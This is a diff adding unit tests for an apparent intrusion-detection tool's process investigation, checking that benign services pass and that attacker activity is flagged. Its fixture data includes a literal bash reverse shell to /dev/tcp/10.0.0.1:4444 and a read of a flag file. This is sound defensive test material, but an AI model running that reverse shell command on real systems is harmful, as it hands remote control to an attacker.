@@ -280,6 +280,38 @@ def test_attacker_flag_read_is_a_breach():
     assert result["assessment"] == "BREACH"
 
 
+_PS_HEADER = "USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND"
+
+
+def test_investigate_processes_ignores_benign_baseline_services():
+    # The live false positive: baseline tcpdump/sshd flagged critical → BREACH.
+    executor = _executor()
+    ps = "\n".join([
+        _PS_HEADER,
+        "root  2902 3.0 0.1 1000 2000 ?  Ss 10:00 0:01 tcpdump -i any",
+        "root     1 0.0 0.0  100  200 ?  Ss 09:00 0:00 /sbin/init",
+    ])
+    executor.execute = MagicMock(return_value=ps)
+    result = executor.investigate_processes()
+    assert result["critical_count"] == 0
+    assert result["assessment"] != "BREACH"
+    tcp = [p for p in result["processes"] if "tcpdump" in p["command"]][0]
+    assert tcp["suspicious"] is False
+
+
+def test_investigate_processes_flags_flag_read_and_reverse_shell():
+    executor = _executor()
+    ps = "\n".join([
+        _PS_HEADER,
+        "root    3100 0.0 0.0 100 200 ? S 10:01 0:00 cat /root/flag.txt",
+        "vagrant 3200 0.0 0.0 100 200 ? S 10:02 0:00 bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+    ])
+    executor.execute = MagicMock(return_value=ps)
+    result = executor.investigate_processes()
+    assert result["critical_count"] >= 2
+    assert result["assessment"] == "BREACH"
+
+
 def test_parse_auth_log_returns_findings():
     executor = ToolExecutor(host="localhost", user="testuser", pwd="testpassword")
     raw = (
